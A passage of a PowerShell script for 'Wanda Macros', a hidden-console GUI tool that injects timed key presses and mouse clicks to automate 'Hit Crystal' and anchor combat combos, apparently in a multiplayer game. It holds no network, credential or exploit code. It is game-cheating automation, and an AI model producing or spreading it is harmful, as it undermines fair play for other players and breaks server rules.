param([switch]$MacroMode)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
public static class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern bool FreeConsole();
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
    public const int VK_HOME = 0xDC;
    public const uint KEYEVENTF_KEYUP     = 0x0002;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP   = 0x0010;
    public const uint MOUSEEVENTF_LEFTDOWN  = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP    = 0x0004;
    public const uint MOUSEEVENTF_XDOWN     = 0x0080;
    public const uint MOUSEEVENTF_XUP       = 0x0100;
    public const uint XBUTTON1 = 0x0001;

    public static void PressKey(byte vk) {
        keybd_event(vk, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
    public static void RightClick() {
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
    }
    public static void BackClick() {
        mouse_event(MOUSEEVENTF_XDOWN, 0, 0, XBUTTON1, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_XUP, 0, 0, XBUTTON1, UIntPtr.Zero);
    }
    public static void LeftClick() {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
        Thread.Sleep(5);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
    }
}
"@

if ($MacroMode) {
    [Win32]::FreeConsole() | Out-Null

    function Get-VKCode {
        param([string]$keyName)
        switch ($keyName) {
            "Mouse1"  { return 0x01 }
            "Mouse2"  { return 0x02 }
            "Mouse3"  { return 0x04 }
            "Mouse4"  { return 0x05 }
            "Mouse5"  { return 0x06 }
            "None"    { return -1 }
            default {
                try {
                    $k = [System.Windows.Forms.Keys]$keyName
                    return [int]$k
                } catch { return -1 }
            }
        }
    }

    # ── Simplified macro functions using generalized delays ──

    function Run-HitCrystal-OnPress {
        [Win32]::keybd_event($script:hcKey1, 0, 0, [UIntPtr]::Zero)
        [System.Threading.Thread]::Sleep($script:delays.hc_swap)
        [Win32]::keybd_event($script:hcKey1, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
        [System.Threading.Thread]::Sleep($script:delays.hc_swap)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.hc_click)
        if ($script:hcAction2 -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::keybd_event($script:hcKey2, 0, 0, [UIntPtr]::Zero)
            [System.Threading.Thread]::Sleep($script:delays.hc_key)
            [Win32]::keybd_event($script:hcKey2, 0, [Win32]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
        }
    }

    function Run-HitCrystal-WhileHolding {
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.hc_hold)
        [Win32]::LeftClick()
    }

    function Run-SingleAnchor {
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.sa_crystal)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.sa_place)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.sa_slot)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.sa_action)
        if ($script:ancBackAction -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::PressKey($script:ancBackKey)
        }
        [System.Threading.Thread]::Sleep($script:delays.sa_action)
        [Win32]::RightClick()
    }

    function Run-DoubleAnchor {
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.da_crystal)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.da_slot)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_use)
        [Win32]::PressKey(0x43)
        [System.Threading.Thread]::Sleep($script:delays.da_crystal)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_place)
        [Win32]::PressKey($script:ancSlot)
        [System.Threading.Thread]::Sleep($script:delays.da_slot)
        [Win32]::RightClick()
        [System.Threading.Thread]::Sleep($script:delays.da_use)
        if ($script:ancBackAction -eq "mouse") {
            [Win32]::BackClick()
        } else {
            [Win32]::PressKey($script:ancBackKey)
        }
        [System.Threading.Thread]::Sleep($script:delays.da_back)
        [Win32]::RightClick()
    }

    # ── State ──

    $script:btnStates  = @{ 0 = $false; 1 = $false; 2 = $false }
    $script:btnKeys    = @{ 0 = "None"; 1 = "None"; 2 = "None" }
    $script:btnRefs    = @($null, $null, $null)
    $script:dotRefs    = @($null, $null, $null)
    $script:glowRefs   = @($null, $null, $null)
    $script:keyBtns    = @($null, $null, $null)
    $script:listening  = -1
    $script:guiForm    = $null
    $script:homeWasDown = $false
    $script:mbWas  = $false
    $script:xb1Was = $false
    $script:xb2Was = $false
    $script:triggerWas = @{ 0 = $false; 1 = $false; 2 = $false }

    $script:activePreset  = "Brxtwurst"
    $script:hcKey1        = 0x32
    $script:hcAction2     = "key"
    $script:hcKey2        = 0x33
    $script:ancSlot       = 0x56
    $script:ancBackAction = "mouse"
    $script:ancBackKey    = 0x00
    $script:presetBrxBtn  = $null
    $script:presetWanBtn  = $null

    # Simplified delays: 13 total (was 21)
    $script:delays = @{
        hc_swap    = 10     # Hit Crystal: swap key timing
        hc_click   = 25     # Hit Crystal: after right click
        hc_key     = 10     # Hit Crystal: after second key
        hc_hold    = 35     # Hit Crystal: hold mode click gap
        sa_crystal = 10     # Single Anchor: after crystal key
        sa_place   = 25     # Single Anchor: after place click
        sa_slot    = 20     # Single Anchor: after slot key
        sa_action  = 10     # Single Anchor: after use/back
        da_crystal = 15     # Double Anchor: after crystal key
        da_place   = 25     # Double Anchor: after place click
        da_slot    = 25     # Double Anchor: after slot key
        da_use     = 25     # Double Anchor: after use click
        da_back    = 15     # Double Anchor: after back action
    }

    function Finish-Listen {
        param([string]$keyName)
        try {
            $ci = $script:listening
            if ($ci -lt 0) { return }
            $script:listening = -1
            $script:btnKeys[$ci] = $keyName
            if ($script:keyBtns[$ci] -and -not $script:keyBtns[$ci].IsDisposed) {
                $script:keyBtns[$ci].Text = $keyName
                $script:keyBtns[$ci].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                $script:keyBtns[$ci].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
            }
        } catch {}
    }

    # ── GUI Builder ──

    function New-BrxtwurstForm {
        $w = 720
        $h = 780
        $pad = 32
        $contentW = $w - ($pad * 2)
        $cardPad = 16

        # ── Colors (Catppuccin Mocha) ──
        $baseBg     = [System.Drawing.ColorTranslator]::FromHtml("#1e1e2e")
        $mantleBg   = [System.Drawing.ColorTranslator]::FromHtml("#181825")
        $crustBg    = [System.Drawing.ColorTranslator]::FromHtml("#11111b")
        $surface0   = [System.Drawing.ColorTranslator]::FromHtml("#313244")
        $surface1   = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
        $surface2   = [System.Drawing.ColorTranslator]::FromHtml("#585b70")
        $overlay0   = [System.Drawing.ColorTranslator]::FromHtml("#6c7086")
        $textClr    = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
        $subtextClr = [System.Drawing.ColorTranslator]::FromHtml("#a6adc8")
        $subtext0   = [System.Drawing.ColorTranslator]::FromHtml("#bac2de")
        $accentClr  = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
        $accentDim  = [System.Drawing.ColorTranslator]::FromHtml("#45364d")
        $greenClr   = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
        $greenDim   = [System.Drawing.ColorTranslator]::FromHtml("#2a3d29")
        $redClr     = [System.Drawing.ColorTranslator]::FromHtml("#f38ba8")
        $yellowClr  = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")

        # ── Main Form ──
        $f = New-Object System.Windows.Forms.Form
        $f.Text            = "Wanda Macros"
        $f.ClientSize      = New-Object System.Drawing.Size($w, $h)
        $f.StartPosition   = "CenterScreen"
        $f.FormBorderStyle = "None"
        $f.BackColor       = $crustBg
        $f.Font            = New-Object System.Drawing.Font("Segoe UI", 10)
        $f.TopMost         = $true
        $f.KeyPreview      = $true
        $f.ShowInTaskbar   = $true
        $f.MinimizeBox     = $true
        $f.Padding         = New-Object System.Windows.Forms.Padding(1)
        $f.Region          = [System.Drawing.Region]::new([System.Drawing.Rectangle]::new(0, 0, $w, $h))

        # Key listening
        $f.Add_KeyDown({
            if ($script:listening -ge 0) {
                Finish-Listen $_.KeyCode.ToString()
                $_.Handled = $true
                $_.SuppressKeyPress = $true
            }
        })

        # Drag support
        $f.Add_MouseDown({ if ($_.Button -eq "Left") { $this.Tag = $_.Location } })
        $f.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.Tag) {
                $p = $this.Tag
                $this.Location = New-Object System.Drawing.Point(
                    ($this.Location.X + $_.X - $p.X),
                    ($this.Location.Y + $_.Y - $p.Y))
            }
        })
        $f.Add_MouseUp({ $this.Tag = $null })

        # ── Title bar area ──
        $titleBar = New-Object System.Windows.Forms.Panel
        $titleBar.Size      = New-Object System.Drawing.Size($w, 56)
        $titleBar.Location  = New-Object System.Drawing.Point(0, 0)
        $titleBar.BackColor = $mantleBg
        $titleBar.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
        $titleBar.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
                $p = $this.FindForm().Tag
                $this.FindForm().Location = New-Object System.Drawing.Point(
                    ($this.FindForm().Location.X + $_.X - $p.X),
                    ($this.FindForm().Location.Y + $_.Y - $p.Y))
            }
        })
        $titleBar.Add_MouseUp({ $this.FindForm().Tag = $null })
        $f.Controls.Add($titleBar)

        # Accent glow bar at top
        $accent = New-Object System.Windows.Forms.Panel
        $accent.Size      = New-Object System.Drawing.Size($w, 3)
        $accent.Location  = New-Object System.Drawing.Point(0, 0)
        $accent.BackColor = $accentClr
        $titleBar.Controls.Add($accent)

        # Glow panel under accent (simulates glow)
        $accentGlow = New-Object System.Windows.Forms.Panel
        $accentGlow.Size      = New-Object System.Drawing.Size($w, 4)
        $accentGlow.Location  = New-Object System.Drawing.Point(0, 3)
        $accentGlow.BackColor = $accentDim
        $titleBar.Controls.Add($accentGlow)

        # Title text
        $titleLbl = New-Object System.Windows.Forms.Label
        $titleLbl.Text      = "Wanda Macros"
        $titleLbl.ForeColor = $textClr
        $titleLbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 15)
        $titleLbl.AutoSize  = $false
        $titleLbl.Size      = New-Object System.Drawing.Size(300, 42)
        $titleLbl.Location  = New-Object System.Drawing.Point($pad, 10)
        $titleLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
        $titleLbl.BackColor = [System.Drawing.Color]::Transparent
        $titleLbl.Add_MouseDown({ if ($_.Button -eq "Left") { $this.FindForm().Tag = $_.Location } })
        $titleLbl.Add_MouseMove({
            if ($_.Button -eq "Left" -and $this.FindForm().Tag) {
                $p = $this.FindForm().Tag
                $this.FindForm().Location = New-Object System.Drawing.Point(
                    ($this.FindForm().Location.X + $_.X - $p.X),
                    ($this.FindForm().Location.Y + $_.Y - $p.Y))
            }
        })
        $titleLbl.Add_MouseUp({ $this.FindForm().Tag = $null })
        $titleBar.Controls.Add($titleLbl)

        # Version in title bar
        $verLbl = New-Object System.Windows.Forms.Label
        $verLbl.Text      = "v0.5"
        $verLbl.ForeColor = $surface1
        $verLbl.Font      = New-Object System.Drawing.Font("Segoe UI", 8.5)
        $verLbl.AutoSize  = $true
        $verLbl.BackColor = [System.Drawing.Color]::Transparent
        $verLbl.Location  = New-Object System.Drawing.Point(195, 21)
        $titleBar.Controls.Add($verLbl)

        # Minimize button
        $minBtn = New-Object System.Windows.Forms.Label
        $minBtn.Text      = [char]0x2015
        $minBtn.ForeColor = $overlay0
        $minBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 12)
        $minBtn.AutoSize  = $true
        $minBtn.BackColor = [System.Drawing.Color]::Transparent
        $minBtn.Location  = New-Object System.Drawing.Point(($w - 62), 14)
        $minBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $minBtn.Add_Click({ $this.FindForm().WindowState = [System.Windows.Forms.FormWindowState]::Minimized })
        $minBtn.Add_MouseEnter({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7") })
        $minBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
        $titleBar.Controls.Add($minBtn)

        # Close button
        $xBtn = New-Object System.Windows.Forms.Label
        $xBtn.Text      = [char]0x2715
        $xBtn.ForeColor = $overlay0
        $xBtn.Font      = New-Object System.Drawing.Font("Segoe UI", 12)
        $xBtn.AutoSize  = $true
        $xBtn.BackColor = [System.Drawing.Color]::Transparent
        $xBtn.Location  = New-Object System.Drawing.Point(($w - 32), 14)
        $xBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $xBtn.Add_Click({ $this.FindForm().Hide() })
        $xBtn.Add_MouseEnter({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f38ba8") })
        $xBtn.Add_MouseLeave({ $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#6c7086") })
        $titleBar.Controls.Add($xBtn)

        # ── Scrollable content area ──
        $scroll = New-Object System.Windows.Forms.Panel
        $scroll.Location   = New-Object System.Drawing.Point(0, 56)
        $scroll.Size       = New-Object System.Drawing.Size($w, ($h - 56))
        $scroll.AutoScroll = $true
        $scroll.BackColor  = $baseBg
        $f.Controls.Add($scroll)

        $cy = 18
        $nudW = 88

        # ═════ KEYBIND PRESETS ═════
        $presetHdr = New-Object System.Windows.Forms.Label
        $presetHdr.Text      = "KEYBIND PRESETS"
        $presetHdr.ForeColor = $accentClr
        $presetHdr.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 9)
        $presetHdr.AutoSize  = $false
        $presetHdr.Size      = New-Object System.Drawing.Size($contentW, 22)
        $presetHdr.Location  = New-Object System.Drawing.Point($pad, $cy)
        $scroll.Controls.Add($presetHdr)
        $cy += 30

        $presetW = [int](($contentW - 16) / 2)
        $presetH = 42

        # Brxtwurst preset
        $brxBtn = New-Object System.Windows.Forms.Button
        $brxBtn.Text      = "Brxtwurst"
        $brxBtn.Size      = New-Object System.Drawing.Size($presetW, $presetH)
        $brxBtn.Location  = New-Object System.Drawing.Point($pad, $cy)
        $brxBtn.FlatStyle = "Flat"
        $brxBtn.FlatAppearance.BorderSize         = 2
        $brxBtn.FlatAppearance.MouseOverBackColor = $surface0
        $brxBtn.FlatAppearance.MouseDownBackColor = $accentClr
        $brxBtn.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5)
        $brxBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $brxBtn.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        if ($script:activePreset -eq "Brxtwurst") {
            $brxBtn.BackColor = $surface0
            $brxBtn.ForeColor = $accentClr
            $brxBtn.FlatAppearance.BorderColor = $accentClr
        } else {
            $brxBtn.BackColor = $mantleBg
            $brxBtn.ForeColor = $surface1
            $brxBtn.FlatAppearance.BorderColor = $surface0
        }
        $brxBtn.Add_Click({
            $script:activePreset  = "Brxtwurst"
            $script:hcKey1        = 0x32
            $script:hcAction2     = "key"
            $script:hcKey2        = 0x33
            $script:ancSlot       = 0x56
            $script:ancBackAction = "mouse"
            $script:ancBackKey    = 0x00
            $ac = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
            $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
            $this.ForeColor = $ac
            $this.FlatAppearance.BorderColor = $ac
            $script:presetWanBtn.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
            $script:presetWanBtn.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
            $script:presetWanBtn.FlatAppearance.BorderColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
        })
        $scroll.Controls.Add($brxBtn)
        $script:presetBrxBtn = $brxBtn

        # Wanda preset
        $wanBtn = New-Object System.Windows.Forms.Button
        $wanBtn.Text      = "Wanda"
        $wanBtn.Size      = New-Object System.Drawing.Size($presetW, $presetH)
        $wanBtn.Location  = New-Object System.Drawing.Point(($pad + $presetW + 16), $cy)
        $wanBtn.FlatStyle = "Flat"
        $wanBtn.FlatAppearance.BorderSize         = 2
        $wanBtn.FlatAppearance.MouseOverBackColor = $surface0
        $wanBtn.FlatAppearance.MouseDownBackColor = $accentClr
        $wanBtn.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5)
        $wanBtn.Cursor    = [System.Windows.Forms.Cursors]::Hand
        $wanBtn.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        if ($script:activePreset -eq "Wanda") {
            $wanBtn.BackColor = $surface0
            $wanBtn.ForeColor = $accentClr
            $wanBtn.FlatAppearance.BorderColor = $accentClr
        } else {
            $wanBtn.BackColor = $mantleBg
            $wanBtn.ForeColor = $surface1
            $wanBtn.FlatAppearance.BorderColor = $surface0
        }
        $wanBtn.Add_Click({
            $script:activePreset  = "Wanda"
            $script:hcKey1        = 0x51
            $script:hcAction2     = "mouse"
            $script:hcKey2        = 0x00
            $script:ancSlot       = 0x31
            $script:ancBackAction = "key"
            $script:ancBackKey    = 0x33
            $ac = [System.Drawing.ColorTranslator]::FromHtml("#cba6f7")
            $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
            $this.ForeColor = $ac
            $this.FlatAppearance.BorderColor = $ac
            $script:presetBrxBtn.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#181825")
            $script:presetBrxBtn.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
            $script:presetBrxBtn.FlatAppearance.BorderColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
        })
        $scroll.Controls.Add($wanBtn)
        $script:presetWanBtn = $wanBtn
        $cy += $presetH + 28

        # ═════ MACRO SECTIONS (simplified delays) ═════
        $macroSections = @(
            @{
                Index = 0; Name = "Hit Crystal"
                DelayGroups = @(
                    @{ Header = "ON PRESS"; Items = @(
                        @{ Key = "hc_swap";  Label = "Swap delay" },
                        @{ Key = "hc_click"; Label = "Click delay" },
                        @{ Key = "hc_key";   Label = "Key delay" }
                    )},
                    @{ Header = "WHILE HELD"; Items = @(
                        @{ Key = "hc_hold"; Label = "Hold delay" }
                    )}
                )
            },
            @{
                Index = 1; Name = "Single Anchor"
                DelayGroups = @(
                    @{ Header = "DELAYS"; Items = @(
                        @{ Key = "sa_crystal"; Label = "Crystal delay" },
                        @{ Key = "sa_place";   Label = "Place delay" },
                        @{ Key = "sa_slot";    Label = "Slot delay" },
                        @{ Key = "sa_action";  Label = "Action delay" }
                    )}
                )
            },
            @{
                Index = 2; Name = "Double Anchor"
                DelayGroups = @(
                    @{ Header = "DELAYS"; Items = @(
                        @{ Key = "da_crystal"; Label = "Crystal delay" },
                        @{ Key = "da_place";   Label = "Place delay" },
                        @{ Key = "da_slot";    Label = "Slot delay" },
                        @{ Key = "da_use";     Label = "Use delay" },
                        @{ Key = "da_back";    Label = "Back delay" }
                    )}
                )
            }
        )

        foreach ($section in $macroSections) {
            $idx = $section.Index

            # ── Card container ──
            $cardInnerH = 60
            foreach ($dg in $section.DelayGroups) { $cardInnerH += 32 + ($dg.Items.Count * 38) + 8 }
            $cardH = $cardInnerH + $cardPad

            $card = New-Object System.Windows.Forms.Panel
            $card.Size      = New-Object System.Drawing.Size($contentW, $cardH)
            $card.Location  = New-Object System.Drawing.Point($pad, $cy)
            $card.BackColor = $mantleBg
            $scroll.Controls.Add($card)

            # Left accent strip (glow bar)
            $leftStrip = New-Object System.Windows.Forms.Panel
            $leftStrip.Size      = New-Object System.Drawing.Size(3, $cardH)
            $leftStrip.Location  = New-Object System.Drawing.Point(0, 0)
            $leftStrip.BackColor = $accentClr
            $card.Controls.Add($leftStrip)

            # Left glow behind strip
            $leftGlow = New-Object System.Windows.Forms.Panel
            $leftGlow.Size      = New-Object System.Drawing.Size(5, $cardH)
            $leftGlow.Location  = New-Object System.Drawing.Point(3, 0)
            $leftGlow.BackColor = $accentDim
            $card.Controls.Add($leftGlow)

            $ix = 20
            $iy = $cardPad

            # ── Status glow (soft circle behind dot) ──
            $glow = New-Object System.Windows.Forms.Panel
            $glow.Size     = New-Object System.Drawing.Size(18, 18)
            $glow.Location = New-Object System.Drawing.Point($ix, ($iy + 10))
            if ($script:btnStates[$idx]) { $glow.BackColor = $greenDim } else { $glow.BackColor = $crustBg }
            $card.Controls.Add($glow)
            $script:glowRefs[$idx] = $glow

            # Status dot
            $dot = New-Object System.Windows.Forms.Panel
            $dot.Size     = New-Object System.Drawing.Size(10, 10)
            $dot.Location = New-Object System.Drawing.Point(($ix + 4), ($iy + 14))
            if ($script:btnStates[$idx]) { $dot.BackColor = $greenClr } else { $dot.BackColor = $surface1 }
            $card.Controls.Add($dot)
            $script:dotRefs[$idx] = $dot
            $dot.BringToFront()

            # Macro name
            $nameLbl = New-Object System.Windows.Forms.Label
            $nameLbl.Text      = $section.Name
            $nameLbl.ForeColor = $textClr
            $nameLbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 13)
            $nameLbl.AutoSize  = $false
            $nameLbl.Size      = New-Object System.Drawing.Size(($contentW - 260), 38)
            $nameLbl.Location  = New-Object System.Drawing.Point(($ix + 26), $iy)
            $nameLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
            $card.Controls.Add($nameLbl)

            # ON/OFF toggle
            $toggleW = 78
            $toggleH = 36
            $b = New-Object System.Windows.Forms.Button
            if ($script:btnStates[$idx]) { $b.Text = "ON" } else { $b.Text = "OFF" }
            $b.Size      = New-Object System.Drawing.Size($toggleW, $toggleH)
            $b.Location  = New-Object System.Drawing.Point(($contentW - $toggleW - $nudW - 22), ($iy + 1))
            $b.FlatStyle = "Flat"
            $b.FlatAppearance.BorderSize         = 2
            $b.FlatAppearance.MouseOverBackColor = $surface0
            $b.FlatAppearance.MouseDownBackColor = $accentClr
            $b.BackColor = $crustBg
            $b.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5)
            $b.Cursor    = [System.Windows.Forms.Cursors]::Hand
            $b.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
            $b.Tag       = $idx
            if ($script:btnStates[$idx]) {
                $b.ForeColor = $greenClr
                $b.FlatAppearance.BorderColor = $greenClr
            } else {
                $b.ForeColor = $surface1
                $b.FlatAppearance.BorderColor = $surface0
            }
            $b.Add_Click({
                $ci = $this.Tag
                $script:btnStates[$ci] = -not $script:btnStates[$ci]
                $isOn = $script:btnStates[$ci]
                $gn  = [System.Drawing.ColorTranslator]::FromHtml("#a6e3a1")
                $gnD = [System.Drawing.ColorTranslator]::FromHtml("#2a3d29")
                $gy  = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
                $bd  = [System.Drawing.ColorTranslator]::FromHtml("#313244")
                $dk  = [System.Drawing.ColorTranslator]::FromHtml("#11111b")
                if ($isOn) {
                    $this.Text = "ON"
                    $this.ForeColor = $gn
                    $this.FlatAppearance.BorderColor = $gn
                    $script:dotRefs[$ci].BackColor   = $gn
                    $script:glowRefs[$ci].BackColor  = $gnD
                } else {
                    $this.Text = "OFF"
                    $this.ForeColor = $gy
                    $this.FlatAppearance.BorderColor = $bd
                    $script:dotRefs[$ci].BackColor   = $gy
                    $script:glowRefs[$ci].BackColor  = $dk
                }
            })
            $card.Controls.Add($b)
            $script:btnRefs[$idx] = $b

            # Keybind button
            $kb = New-Object System.Windows.Forms.Button
            $kb.Size      = New-Object System.Drawing.Size($nudW, $toggleH)
            $kb.Location  = New-Object System.Drawing.Point(($contentW - $nudW - 10), ($iy + 1))
            $kb.FlatStyle = "Flat"
            $kb.FlatAppearance.BorderSize         = 2
            $kb.FlatAppearance.BorderColor        = $surface0
            $kb.FlatAppearance.MouseOverBackColor = $surface0
            $kb.FlatAppearance.MouseDownBackColor = $accentClr
            $kb.BackColor = $crustBg
            $kb.ForeColor = $surface1
            $kb.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 9.5)
            $kb.Cursor    = [System.Windows.Forms.Cursors]::Hand
            $kb.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
            $kb.Tag       = $idx
            if ($script:btnKeys[$idx] -eq "None") {
                $kb.Text = "..."
            } else {
                $kb.Text = $script:btnKeys[$idx]
                $kb.ForeColor = $textClr
            }
            $kb.Add_Click({
                $ci = $this.Tag
                if ($script:listening -ge 0 -and $script:listening -ne $ci) {
                    try {
                        $prev = $script:listening
                        if ($script:btnKeys[$prev] -eq "None") {
                            $script:keyBtns[$prev].Text = "..."
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#45475a")
                        } else {
                            $script:keyBtns[$prev].Text = $script:btnKeys[$prev]
                            $script:keyBtns[$prev].ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#cdd6f4")
                        }
                        $script:keyBtns[$prev].BackColor = [System.Drawing.ColorTranslator]::FromHtml("#11111b")
                    } catch {}
                }
                $script:listening = $ci
                $this.Text = "..."
                $this.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#f9e2af")
                $this.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#313244")
            })
            $card.Controls.Add($kb)
            $script:keyBtns[$idx] = $kb

            $iy += 52

            # ── Delay settings ──
            foreach ($group in $section.DelayGroups) {
                # Thin separator line
                $dSep = New-Object System.Windows.Forms.Panel
                $dSep.Size      = New-Object System.Drawing.Size(($contentW - 40), 1)
                $dSep.Location  = New-Object System.Drawing.Point($ix, $iy)
                $dSep.BackColor = $surface0
                $card.Controls.Add($dSep)
                $iy += 10

                # Sub-header
                $ghdr = New-Object System.Windows.Forms.Label
                $ghdr.Text      = $group.Header
                $ghdr.ForeColor = $accentClr
                $ghdr.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 8.5)
                $ghdr.AutoSize  = $false
                $ghdr.Size      = New-Object System.Drawing.Size(($contentW - $nudW - 50), 22)
                $ghdr.Location  = New-Object System.Drawing.Point($ix, $iy)
                $card.Controls.Add($ghdr)

                $msLbl = New-Object System.Windows.Forms.Label
                $msLbl.Text      = "ms"
                $msLbl.ForeColor = $surface2
                $msLbl.Font      = New-Object System.Drawing.Font("Segoe UI Semibold", 8)
                $msLbl.AutoSize  = $false
                $msLbl.Size      = New-Object System.Drawing.Size($nudW, 22)
                $msLbl.Location  = New-Object System.Drawing.Point(($contentW - $nudW - 10), $iy)
                $msLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
                $card.Controls.Add($msLbl)
                $iy += 26

                foreach ($item in $group.Items) {
                    $dlbl = New-Object System.Windows.Forms.Label
                    $dlbl.Text      = $item.Label
                    $dlbl.ForeColor = $subtext0
                    $dlbl.Font      = New-Object System.Drawing.Font("Segoe UI", 10)
                    $dlbl.AutoSize  = $false
                    $dlbl.Size      = New-Object System.Drawing.Size(($contentW - $nudW - 60), 34)
                    $dlbl.Location  = New-Object System.Drawing.Point(($ix + 14), $iy)
                    $dlbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
                    $card.Controls.Add($dlbl)

                    $nud = New-Object System.Windows.Forms.NumericUpDown
                    $nud.Size        = New-Object System.Drawing.Size($nudW, 34)
                    $nud.Location    = New-Object System.Drawing.Point(($contentW - $nudW - 10), ($iy + 2))
                    $nud.Minimum     = 0
                    $nud.Maximum     = 1000
                    $nud.Value       = $script:delays[$item.Key]
                    $nud.BackColor   = $crustBg
                    $nud.ForeColor   = $textClr
                    $nud.BorderStyle = "FixedSingle"
                    $nud.Font        = New-Object System.Drawing.Font("Segoe UI Semibold", 10.5)
                    $nud.TextAlign   = [System.Windows.Forms.HorizontalAlignment]::Center
                    $nud.Tag         = $item.Key
                    $nud.Add_ValueChanged({
                        $script:delays[$this.Tag] = [int]$this.Value
                    })
                    $card.Controls.Add($nud)
                    $iy += 38
                }
                $iy += 8
            }

            $cy += $cardH + 14
        }

        $f.Add_FormClosing({ param($s,$e); $e.Cancel = $true; $s.Hide() })
        return $f
    }

    # ── Timer / Macro engine ──

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 50
    $timer.Add_Tick({
        try {
            $state = [Win32]::GetAsyncKeyState([Win32]::VK_HOME)
            $isDown = ($state -band 0x8000) -ne 0
            if ($isDown -and -not $script:homeWasDown) {
                if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
                    $script:guiForm = New-BrxtwurstForm
                }
                if ($script:guiForm.Visible) {
                    $script:guiForm.Hide()
                } else {
                    $script:guiForm.Show()
                    $script:guiForm.Activate()
                }
            }
            $script:homeWasDown = $isDown

